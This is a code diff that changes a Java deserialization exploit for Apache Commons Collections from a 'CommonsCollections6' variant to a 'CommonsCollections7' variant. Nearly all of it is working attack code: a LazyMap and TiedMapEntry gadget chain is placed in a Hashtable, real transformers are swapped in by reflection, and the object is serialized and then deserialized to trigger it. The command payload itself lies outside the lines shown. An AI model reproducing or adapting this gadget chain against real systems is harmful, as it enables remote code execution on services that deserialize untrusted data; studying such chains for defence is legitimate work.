@@ -2,18 +2,17 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.map.LazyMap;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
 
 import java.io.*;
 import java.lang.reflect.Field;
 import java.util.HashMap;
-import java.util.HashSet;
+import java.util.Hashtable;
 import java.util.Map;
 
-public class CommonsCollections6 {
+public class CommonsCollections7 {
     public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
-
         Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
 
         Transformer[] transformers=new Transformer[]{
@@ -25,22 +24,21 @@ public class CommonsCollections6 {
 
         Map map=new HashMap();
         Map lazyMap=LazyMap.decorate(map,chainedTransformer);
-        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"cc6");
+        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"cc7");
 
-        HashSet hashSet=new HashSet(1);
-        hashSet.add(tiedMapEntry);
-        lazyMap.remove("cc6");
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(tiedMapEntry, "cc7");
+        lazyMap.remove("cc7");
 
-        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令
-        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
-        field.setAccessible(true);
-        field.set(chainedTransformer, transformers);
+        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,transformers);
 
-        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("cc6.out"));
-        objectOutputStream.writeObject(hashSet);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("cc7.out"));
+        objectOutputStream.writeObject(hashtable);
         objectOutputStream.close();
 
-        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("cc6.out"));
+        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("cc7.out"));
         objectInputStream.readObject();
 
     }
